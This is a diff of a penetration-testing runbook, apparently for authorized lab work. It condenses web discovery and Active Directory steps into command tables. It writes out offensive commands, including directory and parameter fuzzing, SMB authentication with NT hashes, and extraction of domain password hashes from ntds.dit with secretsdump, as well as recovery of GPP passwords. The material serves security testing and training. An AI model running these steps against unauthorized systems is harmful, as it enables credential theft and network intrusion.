-| Completed empty GET or 204 | Record only that response; choose another visible function or a request-specific **WEB-08** question. |
-| Login or 401/403 | **WEB-09** to separate identity from permission. |
-| 404 or soft-not-found | **WEB-04** with the ordinary missing-path response as a baseline. |
-| `transport_or_rate_limit`: incomplete response, repeated 5xx or 429 | **PAUSE-COVERAGE**; preserve the missing fact and respect Retry-After. |
+| Paths, forms or functions found | **[WEB-04](./web-04)**, **[WEB-06](./web-06)**, **[WEB-08](./web-08)**. |
+| Redirect or link to another hostname | **WEB-05**. |
+| Login or 401/403 | **WEB-09**. |
+| 404 or soft-404 | **WEB-04** with the missing-path baseline. |
+| Repeated 5xx, 429 or broken transport | **PAUSE-COVERAGE**. |
+
+GET and request work continues at **WEB-06** and **WEB-08**.
 
 ## WEB-04 Discover unlinked directories and files
 
-Enter when: The current HTTP base and a normal response are known.
+Enter when: you have a working base URL.
 
-Question: Which distinct unlinked resources need inspection?
+Pick one scanner; gobuster is the lighter default.
 
-Choose Feroxbuster OR Gobuster and run it against the current application base.
-
-Option A  Feroxbuster
-
-```text
-feroxbuster -u '<TARGET_URL>/' \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x php,html,txt,bak,old,zip,conf -t 50
+```bash
+gobuster dir -u '<TARGET_URL>/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,old,zip,conf -t 50 -o gobuster.txt
 ```
 
-Option B  Gobuster
+Or `feroxbuster -u '<TARGET_URL>/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,old,zip,conf -t 50`. Establish a false-response baseline first and reduce threads on 429.
 
-```text
-gobuster dir -u '<TARGET_URL>/' \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x php,html,txt,bak,old,zip,conf -t 50 \
-  -o gobuster.txt
-```
-
-Prioritize dynamic endpoints first, then small text/config/backup files, downloaded static artifacts, redirects or denied paths, and finally low-value static assets. Queue nested application bases for another pass. Reduce threads on 429, timeouts or unstable 5xx responses.
-
-- downloaded_artifact: A downloaded static resource is now a local artifact. Verify its local bytes and type before interpreting metadata, strings or embedded content. Next: ART-01.
-- distinct_paths: Inspect distinct paths and fingerprint each relevant application base. Next: WEB-03.
-- get_input: A real request exposes a GET field to replay. Next: WEB-06.
-- form_or_api: A real request exposes a form or API body. Next: WEB-08.
-- missing_input_name: The page demonstrates an input but its field name remains unknown. Next: WEB-07.
-- wildcard_or_filter_gap: Establish a false-response baseline before one justified retry. Next: WEB-04.
-- no_new_lead: Preserve checked bases, list and filters; choose another endpoint. Next: NET-05.
-- unstable_or_rate_limited: Respect rate limits and retain partial discovery. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Dynamic path or input | **WEB-03**, **WEB-06** or **WEB-08**. |
+| Downloaded file | **ART-01**. |
+| Wildcard or filtering noise | Compare against the baseline, then one retry. |
+| Nothing new | **NET-05**. |
+| Rate limited or unstable | **PAUSE-COVERAGE**. |
 
 ## WEB-03 Fingerprint the application
 
-Enter when: A working application page or nested installation is available.
+Enter when: a page or a nested app responds.
 
-Question: Which product hints are supported by this exact base?
-
-Run against the working page or nested installation, not automatically the server root.
-
-```text
+```bash
 whatweb -a 1 -v --follow-redirect=never '<TARGET_URL>'
 ```
 
-Keep scanner text as a reported hint until the operator explicitly confirms an editable product identity. A confirmed product may open one service-and-base EXP-01 review; CMS-specific inventory remains available through WEB-11.
+A scanner string is a hint, not a confirmed version.
 
-- product_identity_confirmed: Confirm the editable product identity against the exact report, then review one local candidate. This does not establish vulnerability or execution authority. Next: EXP-01.
-- cms_identified: Confirm a CMS against response evidence before its matching inventory. Next: WEB-11.
-- get_request_observed: Replay an observed GET field, not a guessed parameter. Next: WEB-06.
-- form_request_observed: Inspect a real form or API request. Next: WEB-08.
-- permitted_account: Use the normal sign-in flow with an authorized account. Next: WEB-09.
-- webdav_or_default_file_lead: Check the evidenced authoring or default-file lead. Next: WEB-12.
-- unconfirmed_product: Keep the hint unconfirmed and inspect public functions. Next: WEB-01.
-- transport_error: Preserve the exact base and error before retrying. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Product confirmed by the response | **EXP-01** with that version. |
+| CMS named | **WEB-11**. |
+| Observed GET or form input | **WEB-06** / **WEB-08**. |
+| WebDAV or default-file lead | **WEB-12**. |
+| Product stays unconfirmed | **WEB-01**. |
 
 ## WEB-06 Inspect and replay an observed GET parameter
 
-Enter when: A real GET request and its ordinary parameter value have been observed.
+Enter when: a real GET request and its normal value are captured.
 
-Question: Does one benign changed value alter the response?
-
-In Developer Tools > Network, use the feature and inspect its query parameters. Replay a benign value.
-
-```text
-curl -sS -i --get '<TARGET_URL>' \
-  --data-urlencode '<PARAM>=<BENIGN_VALUE>'
+```bash
+curl -sS -i --get '<TARGET_URL>' --data-urlencode '<PARAM>=<BENIGN_VALUE>'
 ```
 
-Compare status, body and redirect with the normal value. Input-dependent errors need investigation, not a downtime label.
+Compare status, body and redirect with the normal value.
 
-- benign_comparison_recorded: Keep the exact GET comparison. No different observed web request remains; choose another observed service at NET-05 or record the specific missing fact. Do not replay unchanged input. Next: NET-05.
-- input_dependent_anomaly: A controlled anomaly needs its matching manual input-analysis route; it is not exploit proof. Next: GAP-WEB-INPUT.
-- wrong_format_or_required_fields: Recheck the actual request format and required fields. Next: WEB-08.
-- rate_limit_or_failure: Preserve ambiguity without labeling the application down. Next: PAUSE-COVERAGE.
-- different_observed_get_request: The first comparison is retained and a distinct captured GET request asks a different question. Use its own ordinary value; do not replay the completed input. Next: WEB-06.
-- different_observed_form_request: The first comparison is retained and a distinct captured form/API request asks a different question. Keep that request's actual method and body format. Next: WEB-08.
-- get_file_read_hypothesis: The working GET actually names a file; choose one OS-matched baseline/probe/missing-file comparison. Next: WREAD-01.
-- get_posix_command_hypothesis: An ordinary GET value plausibly reaches an unquoted POSIX command argument; use the assembled-marker comparison, not a guessed Windows carrier. Next: WEXEC-01.
-- get_numeric_select_hypothesis: A working numeric identifier feeds a known read-only result lookup; compare true/false/restored controls, not login or unknown writes. Next: WSQL-01.
-
-After one valid benign GET comparison, keep the actual request and result.
-If another observed web request answers a different question, select its
-matching WEB-06 or WEB-08 decision directly. If not, return to **NET-05** for
-another observed service, or **PAUSE-COVERAGE** for one named missing fact. Do not
-restart WEB-01 or rerun the same input just to advance the checklist. A normal
-comparison is not proof that the field is safe against every input.
+| Result | Next |
+| --- | --- |
+| Nothing changes | **NET-05**. |
+| Input-dependent error or anomaly | **GAP-WEB-INPUT**. |
+| Value names a file | **WREAD-01**. |
+| Value reaches a POSIX shell argument | **WEXEC-01**. |
+| Numeric value feeds a query | **WSQL-01**. |
 
 ## WEB-08 Inspect a form or API request
 
-Enter when: A normal form or API request is available in browser Network.
+Enter when: a real form or API request is captured.
 
-Question: Which method, body format and fields are actually required?
-
-In Network, submit a harmless search or preview. Inspect method, content type, query and request body.
-
-```text
+```bash
 curl -sS -i --request POST '<TARGET_URL>' \
   --data-urlencode '<FIELD>=<BENIGN_VALUE>' \
-  --data-urlencode '<REQUIRED_FIELD>=<CAPTURED_VALUE>' \
-  --data-urlencode '<SUBMIT_FIELD>=<CAPTURED_SUBMIT_VALUE>'
+  --data-urlencode '<REQUIRED_FIELD>=<CAPTURED_VALUE>'
 ```
 
-For a URL-encoded POST, replay the working request and change only the current field. For JSON or multipart, preserve the observed format in the browser or Burp Community.
+Keep the captured method, content type and every required field. JSON or multipart goes through Burp or the browser.
 
-- urlencoded_comparison: Keep the exact ordinary form comparison. No different observed web request remains; choose another observed service at NET-05 or record the specific missing fact. Do not repeat the unchanged form. Next: NET-05.
-- content_discovery_incomplete: HTTP remains the main observed service and unlinked-content discovery is incomplete. Preserve this comparison and continue the unfinished discovery pass. Next: WEB-04.
-- observed_unquoted_posix_command_context: The exact working URL-form POST plausibly reaches an unquoted POSIX command argument. Keep POST, every required field and the fresh anti-CSRF value in the controlled comparison. Next: WEXEC-01.
-- json_or_multipart: Replay the actual format in the browser or local proxy; do not force form encoding. Next: WEB-08.
-- upload_function: A normal file upload function was actually observed. Next: WEB-10.
-- input_dependent_anomaly: Inspect the specific input anomaly manually before any capability claim. Next: GAP-WEB-INPUT.
-- authentication_required: Only a permitted account can open this protected function. Next: WEB-09.
-- transport_or_rate_limit: Resolve the failure before further comparisons. Next: PAUSE-COVERAGE.
-- form_file_read_hypothesis: The exact form request and repeated browser controls support a file-read question. Review the file-read prerequisites and one scoped verification before recording access. Next: WREAD-01.
-- form_command_hypothesis: The exact form request and repeated browser controls support a command-context question. Determine the actual parser and quoting before selecting a reviewed verification. Next: WEXEC-01.
-- form_numeric_query_hypothesis: A numeric input and an attributed database diagnostic support a query-context question. Review the actual backend and request before choosing one scoped verification. Next: WSQL-01.
-- different_observed_get_request: The first comparison is retained and a distinct captured GET request asks a different question. Use its own ordinary value; do not replay the completed form. Next: WEB-06.
-- different_observed_form_request: The first comparison is retained and a distinct captured form/API request asks a different question. Keep that request's actual method and body format. Next: WEB-08.
-- verified_single_quoted_read_lookup: A captured ordinary GET or URL-form read-only lookup has a supported single-quoted SELECT context; preserve fields/identity, compare true/false/restored controls. Next: WSQL-02.
-- observed_quoted_posix_command_context: The ordinary GET/form request reaches a known quoted POSIX argument with safe original command and tail; choose only the evidenced quote context. Next: WEXEC-02.
-- observed_windows_cmd_context: Windows cmd construction, ordinary safe value, quoting and returned output are evidenced; PowerShell/direct argv remain separate contexts. Next: WEXEC-03.
-
-After one valid URL-encoded form comparison, keep the captured method, fields,
-identity and response. Follow another observed WEB-06/08 request only if it
-answers a different question. Otherwise use **NET-05** for another service or
-**PAUSE-COVERAGE** for one missing fact. JSON and multipart still require their
-actual captured format; do not treat a failed format conversion as a negative
-input result.
+| Result | Next |
+| --- | --- |
+| Nothing changes | **NET-05**, or **WEB-04** if discovery is unfinished. |
+| Upload function observed | **WEB-10**. |
+| Required account observed | **WEB-09**. |
+| POSIX argument, file read or SQL context | **WEXEC-01** / **WREAD-01** / **WSQL-01**. |
+| Anomaly | **GAP-WEB-INPUT**. |
 
 ## WEB-05. Check one observed hostname
 
-Enter when a redirect, link or response names a hostname that is in scope for
-this assigned endpoint. Keep its exact scheme and port. In Kali, resolve that
-hostname to the assigned IP for this request without changing system DNS:
+Enter when: a redirect or link names an in-scope hostname.
 
 ```bash
-curl -i --resolve '<HOSTNAME>:<PORT>:<TARGET_IP>' '<EXACT_OBSERVED_URL>'
+curl -i --resolve '<HOSTNAME>:<PORT>:<TARGET_IP>' '<EXACT_URL>'
 ```
 
-The URL must use the same hostname and port as `--resolve`. Do not bypass TLS
-validation. Compare the response with the already known base; a distinct status
-alone is not a distinct application.
+Use the same scheme, hostname and port in both the URL and `--resolve`.
 
 | Result | Next |
 | --- | --- |
-| Distinct in-scope application or function | **WEB-01** at this exact scheme, hostname, port and base. |
-| Same content or a false-host response | Keep the comparison; **WEB-04** at the known base or **NET-05** for another observed lead. |
-| Hostname or redirect scope is unconfirmed | **PAUSE-ROUTE**; do not request an unapproved origin. |
-| Certificate, connection or incomplete-response error | **PAUSE-COVERAGE** with the exact URL and error; do not infer the host is absent. |
+| Distinct in-scope app | **WEB-01** at that origin. |
+| Same content or false-host response | **WEB-04**. |
+| Scope unclear | **PAUSE-ROUTE**. |
+| TLS or transport error | **PAUSE-COVERAGE**. |
 
 ## WEB-07 Discover missing GET parameter names
 
-Enter when: A working page implies an input whose name is absent from links, forms and scripts.
+Enter when: a page implies an input whose name is not in the HTML or scripts.
 
-Question: Does a candidate parameter differ from an unknown-name baseline?
-
-Use only when the page suggests an input but links, forms and scripts do not reveal its name.
-
-```text
-ffuf -u '<TARGET_URL>?FUZZ=test' \
-  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -mc all -t 10 -rate 20 -maxtime 120
+```bash
+ffuf -u '<TARGET_URL>?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -t 10 -rate 20 -maxtime 120
 ```
 
-Compare with an unknown parameter. A distinct response is a candidate; confirm it through WEB-06.
+Compare against an unknown parameter; confirm a hit through **WEB-06**.
 
-- distinct_candidate: Confirm the candidate through one benign GET replay. Next: WEB-06.
-- no_distinct_candidate: Retain the tested list and return to public behavior. Next: WEB-01.
-- unstable_baseline: Do not promote an unstable response to a parameter finding. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Distinct candidate | **WEB-06**. |
+| Nothing distinct | **WEB-01**. |
 
 ## WEB-09. Check a signed-in function
 
-Enter when an observed function needs a permitted account. Sign in once through
-the normal browser UI. Confirm the displayed account and exact
-scheme/hostname/port, then open one account-only function and inspect its
-ordinary request and response in Network. Do not guess credentials or forward
-a session header to another origin.
+Enter when: a function needs a permitted account.
+
+Sign in through the UI, confirm the account and origin, then open one account-only function and inspect its request. Do not forward cookies to another origin.
 
 | Result | Next |
 | --- | --- |
-| Expected account and account-only response are visible | **WEB-06** for an observed GET, **WEB-08** for a form/API request, or **WEB-10** for an observed upload. |
-| No permitted account | Leave this function blocked; **WEB-01** for public functions or **NET-05** for another service. |
-| Login redirect, expired session or unknown identity | Resolve the normal sign-in result here; do not call a 200/login body proof of access. |
-| Identity is confirmed but this function is denied | Record the permission boundary. **WEB-01** for another available function or the changed-context check for a specifically changed identity. |
-| Changed origin, TLS error or incomplete response | Pause the affected request and preserve the exact error; no access claim. |
+| Account-only function works | **WEB-06**, **WEB-08** or **WEB-10**. |
+| No permitted account | **WEB-01** or **NET-05**. |
+| Login redirect or expired session | Resolve sign-in first. |
+| Identity confirmed but function denied | Record the boundary; **WEB-01**. |
 
 ## WEB-10. Select one observed upload question
 
-Enter when an actual upload form is visible. Inspect its normal request in
-browser Network: file field, accepted type, required fields, current identity,
-returned record/path and application delete action. Do not upload a separate
-test file here; **WUPLOAD-01** makes, reads and removes the one inert marker.
+Enter when: an upload form is on screen.
+
+Read the request in Network: file field, accepted type, required fields, returned path and delete action.
 
 | Result | Next |
 | --- | --- |
-| New-file upload and exact delete action are known | **WUPLOAD-01** for one harmless marker, readback and exact cleanup. |
-| Existing application template is edited instead of a new file | **WEDIT-01** for original backup and restoration; never use upload-only deletion. |
-| Identity or required request fields are unclear | **WEB-09** for account context or **WEB-08** for the exact request format. |
-| No attributable delete/recovery action is known | Pause the upload question until recovery is defined; do not create an orphan. |
-| A file was already uploaded | Inspect its exact returned record and URL; keep its cleanup owed at **WUPLOAD-01** or **PAUSE-RECOVERY**. Do not upload again for diagnosis. |
+| Delete action known | **WUPLOAD-01** with one inert marker. |
+| Existing template is edited, not uploaded | **WEDIT-01**. |
+| Identity or fields unclear | **WEB-09** / **WEB-08**. |
+| No delete or recovery path | **PAUSE-RECOVERY** before uploading. |
 
 ## WEB-11. Inventory one confirmed CMS and review one local candidate
 
-Enter only with a product supported by the exact application response or an
-authorized admin view. Reuse the page's existing HTML: WordPress plugin/theme
-asset paths identify component names, not necessarily versions. A `?ver=` asset
-query alone is not a confirmed plugin version. Choose the one matching offline
-scanner against that
-installation base; do not run the other CMS commands. For WordPress:
+Enter only when the exact product is confirmed by the response or an admin view.
 
 ```bash
 wpscan --url '<INSTALLATION_URL>' --enumerate ap,at --no-update
-```
-
-For an observed Drupal, Joomla, SilverStripe or Moodle installation, substitute
-that exact product name in one Droopescan command:
-
-```bash
 droopescan scan <CONFIRMED_CMS> -u '<INSTALLATION_URL>'
+searchsploit --disable-colour --title '<PRODUCT>' '<VERSION>'
+searchsploit --path '<EDB_ID>'
 ```
 
-Confirm one relevant component/version from a response or permitted admin
-inventory. A scanner hint alone is not a version or vulnerability. If a local
-source candidate is useful, search the installed index:
-
-```bash
-searchsploit --disable-colour --title '<observed-product-or-component>' '<observed-version>'
-```
-
-Choose one matching result and locate its source without running it:
-
-```bash
-searchsploit --path '<selected-EDB-ID>'
-```
+Use only the matching CMS command. A `?ver=` value is not a version.
 
 | Result | Next |
 | --- | --- |
-| Confirmed component and matching local source | **EXP-01** to inspect its exact prerequisites, effects and recovery. A hit is not exploit proof. |
-| Distinct observed paths | **WEB-04** for one path at its actual base. |
-| Product or version remains uncertain | **WEB-03** for one direct response/admin observation; do not select an exploit from scanner text. |
-| No matching local source or scanner unavailable | **PAUSE-COVERAGE** or another **NET-05** lead; local reference coverage is not vulnerability absence. |
-| Rate or transport problem | **PAUSE-COVERAGE** with the incomplete inventory. |
+| Component and version confirmed | **EXP-01** with the local source. |
+| More paths seen | **WEB-04**. |
+| Version still uncertain | **WEB-03**. |
+| No local source | **PAUSE-COVERAGE**. |
 
 ## WEB-12. Check default files software and WebDAV
 
-Enter when: IIS, authoring behavior or a specific default-file question is evidenced.
-
-Question: Does read-only discovery show a real DAV collection or useful file?
-
-When IIS or authoring behavior is plausible, make two read-only WebDAV discovery requests. Use the optional focused Nikto pass only when default-file or product questions remain.
-
-WebDAV methods and challenge
+Enter when: IIS, authoring behaviour or a default-file question is evidenced.
 
 ```text
 curl -sS -i -X OPTIONS '<TARGET_URL>'
-```
-
-Read-only collection probe
-
-```text
 curl -sS -i -X PROPFIND -H 'Depth: 0' '<TARGET_URL>'
 ```
 
-Optional default-file and software pass
+Optional default-file pass: `nikto -h '<TARGET_URL>' -Tuning 2b`. A `DAV` header or 207 is a lead, not access.
 
-```text
-nikto -h '<TARGET_URL>' -Tuning 2b
-```
-
-A DAV header, WebDAV methods or a 207 Multi-Status response is a WebDAV lead; preserve the exact collection URL and authentication challenge, then route an AD credential to AD-15. Inspect Nikto URLs manually and retain the supporting request and response, not just its conclusion.
-
-- dav_and_validated_ad_identity: Capability plus an already validated credential justifies the separate access/write decision. Next: AD-15.
-- dav_without_identity: Preserve collection URL and challenge; do not infer authenticated access. Next: WEB-09.
-- useful_default_file: Inspect the exact useful resource and its functions. Next: WEB-01.
-- no_confirmed_lead: Preserve what was checked and choose another endpoint. Next: NET-05.
-- transport_or_authentication_error: Retain the response without declaring DAV absent. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| DAV collection with a validated credential | **AD-15**. |
+| DAV without credentials | **WEB-09**. |
+| Useful default file | **WEB-01**. |
+| Nothing confirmed | **NET-05**. |
 
 # windows_ad
 
+AD tasks assume an assigned controller and, from AD-03, a validated credential. WIN tasks assume an already attributed Windows shell. Use one credential form, not both.
+
 ## AD-01 Identify the domain and controller
 
-Shell: Kali
-
-Enter when: The assigned endpoint gives domain-service evidence.
-
-Question: What domain and controller identity are supported before authentication?
-
-Use the assigned IP that exposed Windows domain services. Read the SMB and LDAP identity before authenticating.
-
-SMB identity
+Enter when: the target exposes domain services.
 
 ```text
 nxc smb <TARGET_IP>
-```
-
-LDAP base identity
-
-```text
 ldapsearch -x -H 'ldap://<TARGET_IP>' -s base namingContexts defaultNamingContext dnsHostName
 ```
 
-Record the exact DOMAIN and DC_HOST. Make that hostname resolve to TARGET_IP before Kerberos or hostname-based tools. LDAP denied: keep the SMB identity and continue with supplied credentials.
+Make the returned DC hostname resolve to the target before any Kerberos work.
 
-- identity_observed: Record the exact names and establish scoped hostname resolution. Next: AD-02.
-- ldap_denied_smb_identity: Use one supplied credential with the retained SMB context if available. Next: AD-03.
-- identity_unconfirmed: Resolve controller and domain context before Kerberos or hostname-based work. Next: PAUSE-ROUTE.
+| Result | Next |
+| --- | --- |
+| Domain and DC named | **AD-02**. |
+| SMB identity only, LDAP denied | **AD-03** if you have a credential. |
+| Identity unclear | **PAUSE-ROUTE**. |
 
 ## AD-02. Check one anonymous read per protocol
 
-Enter with an assigned controller address and domain context from **AD-01**.
-Run each permitted anonymous read once. They answer different questions; a
-denial in one protocol says nothing about the other two.
-
-SMB shares:
+Enter when: a controller address and domain context are known.
 
 ```bash
 smbclient -N -L '//<TARGET_IP>'
-```
-
-RPC users and groups:
-
-```bash
 rpcclient -N -U '' '<TARGET_IP>' -c 'enumdomusers; enumdomgroups'
-```
-
-LDAP user descriptions, using the observed base DN:
-
-```bash
 ldapsearch -x -H 'ldap://<TARGET_IP>' -b '<BASE_DN>' '(&(objectCategory=person)(objectClass=user))' sAMAccountName description info comment
 ```
 
-If RPC returns a named user whose display metadata could change the next
-choice, query that metadata once. Do not repeat user enumeration just to create
-a file:
-
-```bash
-rpcclient -N -U '' '<TARGET_IP>' -c 'querydispinfo'
-```
+A denial in one protocol says nothing about the others.
 
 | Result | Next |
 | --- | --- |
-| One accessible share has a relevant file | **AD-04** with the same access context. |
-| One password-like value has an attributed account | **AD-03** for one permitted authentication; a description is not a valid credential. |
-| Users but no secret | **AD-07** only for an eligible AS-REP question; no password guessing. |
-| All three reads denied and no supplied/recovered identity | Record all three denials, then **NET-05** for another observed service. Do not enter credential-only AD tasks. |
-| A read is partial, malformed or its identity is unclear | Preserve that protocol's result at **PAUSE-COVERAGE**. Do not call its directory empty. |
-
-If a supplied or recovered credential already exists, a denied anonymous read
-can instead go to **AD-03** for one justified check. Keep any copied user list
-private; no second RPC query is required for routine inventory.
+| Relevant share file | **AD-04** with the same identity. |
+| Password-like value with a named account | **AD-03**. |
+| Users, no secret | **AD-07** if AS-REP is eligible; otherwise **AD-09** with a credential. |
+| All three denied | **NET-05**. |
 
 ## AD-03 Validate one supplied credential
 
-Shell: Kali
-
-Enter when: One supplied or evidence-backed credential has an exact host and local/domain context.
-
-Question: What does one authentication check actually establish?
-
-Test one supplied plaintext or NT hash against the assigned host once.
-
-Plaintext
+Enter when: one credential has an exact host and domain context.
 
 ```text
 nxc smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>'
-```
-
-NT hash
-
-```text
 nxc smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>'
 ```
 
-[+] confirms SMB authentication on this host. (Pwn3d!) additionally indicates likely local-admin code execution here. [-] requires checking domain, hostname, time and error text before rejecting the credential.
+`Pwn3d!` means likely local admin here. A rejection still needs the domain, host and error checked before you discard the credential.
 
-- authenticated: SMB authentication on this host supports share inventory, not admin execution. Next: AD-04.
-- local_admin_indicated: Confirm the same host and matching execution prerequisite. Next: AD-13.
-- rejected_or_context_error: Check domain, hostname, time and error before rejecting the credential. Next: PAUSE-ROUTE.
-- unresolved: Retain the single attempt without broader credential testing. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Authenticated | **AD-04**. |
+| Admin indicated | **AD-13** on this host. |
+| Rejected | **PAUSE-ROUTE**. |
+| Ambiguous | **PAUSE-COVERAGE**. |
 
-Keep the original single-host credential commands and their context. Success on
-SMB does not validate the same secret for SSH, HTTP, RDP or a database. After an
-evidence-backed, permitted identity/access change, use the changed-context check and choose
-only the service whose previously blocked question now has a justified prerequisite:
+After a credential works, revisit only a question that was blocked on it:
 
 | Prior blocked question on this assigned endpoint | Revisit |
 | --- | --- |
-| SMB share/path access | **SMB-01**, then **SMB-02**, or **AD-04** for the maintained domain-share procedure. |
-| HTTP account-only function | **WEB-09** with the normal sign-in flow. |
-| SSH usable remote session | **SSH-01**, then **SSH-02** after trust check. |
-| RDP desktop | **RDP-01**, then **RDP-02**. |
-| WinRM on an already observed, permitted host | **AD-12** for one service-specific authentication check. A successful SMB login alone does not prove WinRM. |
-| PostgreSQL/MariaDB metadata | **DB-01** with the engine's assigned identity context. |
-| Mailbox read | **MAIL-01**, then **MAIL-02** when the exact permitted mailbox/protocol applies. |
-| Confirmed domain graph right | The matching **AD-09** onward decision, preserving host/domain/right prerequisites. |
-
-No change relevant to the old failure means no automatic retry. Record which
-identity and fact changed, one check and its result. A credential-looking string
-is still a candidate until that exact permitted authentication result exists.
+| SMB share or path | **SMB-01**, then **SMB-02**, or **AD-04**. |
+| HTTP account-only function | **WEB-09**. |
+| SSH session | **SSH-01**, then **SSH-02**. |
+| RDP desktop | **RDP-01**. |
+| WinRM on this host | **AD-12**. |
+| Database metadata | **DB-01**. |
+| Mailbox | **MAIL-01**. |
+| Domain graph right | The matching **AD-09** branch. |
 
 ## AD-04. Read one relevant accessible share file
 
-Enter with an anonymous share from **AD-02** or a validated identity from
-**AD-03**. If the share list for this identity is not yet known, choose the one
-matching authentication form:
+Enter when: AD-02 or AD-03 gave you a share list for a known identity.
 
 ```bash
 nxc smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --shares
-```
-
-```bash
-nxc smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>' --shares
-```
-
-For anonymous access, reuse the **AD-02** list. Open only one observed share
-with the same identity. Choose one matching form, not all three:
-
-```bash
 smbclient '//<TARGET_IP>/<SHARE>' -U '<DOMAIN>/<USERNAME>'
 ```
 
-```bash
-smbclient '//<TARGET_IP>/<SHARE>' --pw-nt-hash -U '<DOMAIN>/<USERNAME>%<NTLM_HASH>'
-```
-
-```bash
-smbclient -N '//<TARGET_IP>/<SHARE>'
-```
-
-Inside `smbclient`, list the observed directory. Download only the file that
-answers the current question to a new private local path:
+Inside smbclient:
 
 ```text
 ls
-cd <OBSERVED_DIRECTORY>
-get <JUSTIFIED_FILE> <NEW_PRIVATE_LOCAL_PATH>
+get <JUSTIFIED_FILE> <LOCAL_PATH>
 quit
-```
-
-If downloaded, record its exact remote path, access identity and local hash:
-
-```bash
-sha256sum '<NEW_PRIVATE_LOCAL_PATH>'
 ```
 
 | Result | Next |
 | --- | --- |
-| File yields one account candidate | Keep its source, then **AD-03** for one justified validation. |
-| Matched ntds.dit and SYSTEM files come from the same backup set | **AD-21** for offline extraction; neither file alone is sufficient. |
-| Relevant SYSVOL or NETLOGON policy file | **AD-06** only for a distinct policy question. |
-| Share has WRITE but no known elevated consumer | **GAP-ACCESS**; write permission alone does not prove execution. |
-| Denied, empty, partial or unstable listing | Keep the exact identity/path result; **NET-05** for another lead or **PAUSE-COVERAGE** when completeness matters. |
-
-Do not bulk-download, upload or replace files. Keep the private copy only while
-needed as adventure evidence and delete that exact copy through the source step's cleanup.
+| Account candidate | **AD-03**. |
+| Matched ntds.dit and SYSTEM | **AD-21**. |
+| SYSVOL or NETLOGON policy file | **AD-06**. |
+| Share writable, no consumer | **GAP-ACCESS**. |
+| Denied or empty | **NET-05**. |
 
 ## AD-21 Extract one offline directory backup
 
-Shell: Kali
-
-Enter when: An offline directory database and SYSTEM hive come from the same recorded backup set.
-
-Question: Does the matched set yield one relevant account candidate?
-
-Use only when AD-04 recovers an offline ntds.dit and SYSTEM hive from the same backup set. Record their share paths and hashes before extraction.
-
-Record the recovered backup hashes
+Enter when: ntds.dit and the SYSTEM hive came from the same backup set.
 
 ```text
 sha256sum '<NTDS_FILE>' '<SYSTEM_FILE>'
-```
-
-Extract from the matched offline files
-
-```text
 impacket-secretsdump -ntds '<NTDS_FILE>' -system '<SYSTEM_FILE>' LOCAL
 ```
 
-Retain the source path and account name with each recovered domain hash. Choose one account justified by existing evidence such as role description graph relationship or service ownership, then validate that one hash through AD-03. Do not test every returned account.
+Choose one hash justified by role or graph evidence; do not test every account.
 
-- justified_hash_candidate: Retain account/source provenance and validate only one evidence-justified hash. Next: AD-03.
-- mismatched_or_failed_extraction: Resolve backup provenance and extraction failure before interpreting material. Next: PAUSE-COVERAGE.
-- no_justified_account: Use existing graph/role evidence to select a candidate; do not test every account. Next: AD-09.
+| Result | Next |
+| --- | --- |
+| Justified hash candidate | **AD-03**. |
+| Extraction failed or mismatched set | **PAUSE-COVERAGE**. |
+| No justified account | **AD-09**. |
 
 ## AD-05 Inventory domain users and computers
 
-Shell: Kali
-
-Enter when: A valid domain credential and controller context are available.
-
-Question: Which observed users, computers and service identities justify targeted follow-up?
-
-With a valid domain credential, collect a readable user and computer inventory from the controller.
-
-Users with plaintext
+Enter when: a valid domain credential works.
 
 ```text
 impacket-GetADUsers '<DOMAIN>/<USERNAME>' -all -dc-ip '<TARGET_IP>'
-```
-
-Users with NT hash
-
-```text
-impacket-GetADUsers '<DOMAIN>/<USERNAME>' -hashes ':<NTLM_HASH>' -all -dc-ip '<TARGET_IP>'
-```
-
-Computers with plaintext
-
-```text
 impacket-GetADComputers '<DOMAIN>/<USERNAME>' -dc-ip '<TARGET_IP>'
 ```
 
-Computers with NT hash
+Add `-hashes ':<NTLM_HASH>'` for hash auth.
 
-```text
-impacket-GetADComputers '<DOMAIN>/<USERNAME>' -hashes ':<NTLM_HASH>' -dc-ip '<TARGET_IP>'
-```
-
-Record enabled-looking users, service-style accounts and computer names. Use the inventory for targeted Kerberos, share and relationship checks; output is not proof that every object was returned.
-
-- eligible_kerberos_candidate: Use the actual account/SPN inventory for the matching material request. Next: AD-07.
-- relationship_question: Collect relationships for this identity rather than infer privilege from names. Next: AD-09.
-- useful_share_context: Return to a named accessible share with its owning identity. Next: AD-04.
-- incomplete_inventory: Output does not prove every object was returned. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Kerberos-eligible account or SPN | **AD-07**. |
+| Relationship question | **AD-09**. |
+| Relevant share context | **AD-04**. |
+| Partial output | **PAUSE-COVERAGE**. |
 
 ## AD-06 Check SYSVOL for legacy GPP credentials
 
-Shell: Kali
-
-Enter when: Authenticated controller policy-share access is established.
-
-Question: Does a specific legacy GPP file contain recoverable credential material?
-
-After authenticated share access works, check the controller's policy shares for legacy Group Policy Preferences passwords.
-
-Plaintext
+Enter when: authenticated policy-share access works.
 
 ```text
 impacket-Get-GPPPassword '<DOMAIN>/<USERNAME>@<DC_HOST>' -dc-ip '<TARGET_IP>'
 ```
 
-NT hash
-
-```text
-impacket-Get-GPPPassword -hashes ':<NTLM_HASH>' -dc-ip '<TARGET_IP>' '<DOMAIN>/<USERNAME>@<DC_HOST>'
-```
-
-A recovered account and password must still be validated through AD-03 on one relevant host. No result does not replace manual inspection of useful SYSVOL and NETLOGON files from AD-04.
-
